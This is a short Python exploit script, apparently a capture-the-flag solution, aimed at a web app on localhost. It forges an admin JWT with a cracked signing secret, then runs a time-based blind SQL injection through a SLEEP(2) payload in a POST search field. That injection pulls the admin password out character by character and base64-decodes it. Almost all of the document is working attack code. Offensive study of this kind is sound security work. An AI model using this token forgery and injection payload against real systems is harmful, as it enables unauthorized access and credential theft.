import jwt, base64, requests
from bs4 import BeautifulSoup
import time, string

secret="rachel" # using john the ripper
url="http://localhost"

encoded_jwt = jwt.encode({"name": "admin"}, secret, algorithm="HS256")

s = requests.Session();
s.cookies.set("user", encoded_jwt)
res = s.get(f"{url}/home")


def naredi_request(niz):
    data = {
        "sql":"mysql",
        "debug":1,
        "search":"' AND (SELECT 1 FROM users u WHERE u.password LIKE BINARY '%s%%' and u.username LIKE 'admin') AND SLEEP(2) AND 'a' LIKE '"%niz
    }
    start = time.time()
    res = s.post(f"{url}/admin/posts", data=data)
    taken = time.time() - start
    return taken > 2

kandidati = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{+/=}"

rezultati = ["ZENURnt3aDBhX000TTQhX2E1NjM1ZDkwYn0"]
zakljuceni = []
while len(rezultati) > 0:
    trenutni = rezultati.pop(0)
    is_end = True
    for c in kandidati:
        n = trenutni + c
        if naredi_request(n):
            is_end=False
            print(n)
            rezultati.append(n)
    if is_end:
        zakljuceni.append(trenutni)
    print(rezultati)

print(zakljuceni)
for z in zakljuceni:
    r=base64.b64decode(z.encode("ASCII")).decode("ASCII")
    print(r)